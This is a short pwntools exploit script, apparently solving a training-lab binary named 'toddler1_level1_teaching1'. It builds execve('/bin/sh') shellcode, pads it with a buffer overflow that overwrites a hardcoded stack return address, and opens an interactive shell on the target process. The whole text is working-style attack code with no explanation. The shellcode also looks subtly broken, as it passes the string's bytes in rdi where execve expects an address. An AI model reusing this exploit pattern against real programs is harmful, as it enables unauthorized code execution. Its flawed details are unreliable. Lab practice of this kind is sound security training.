from pwn import *
shellcode = asm("""
	mov rax, 59
	mov rsi, 0
	movabs rdi, 0x68732f6e69622f
	mov rdx, 0
	syscall
""", arch = 'amd64', os ='linux')

size = 26 + 6 + 8*3 + 6 

addr = b'\x40\xe0\xff\xff\xff\x7f'
offset = b'A'*23
shellcode += offset+addr
p = process('./toddler1_level1_teaching1')
p.sendline(str(int(size)))
p.sendline(shellcode)
p.interactive()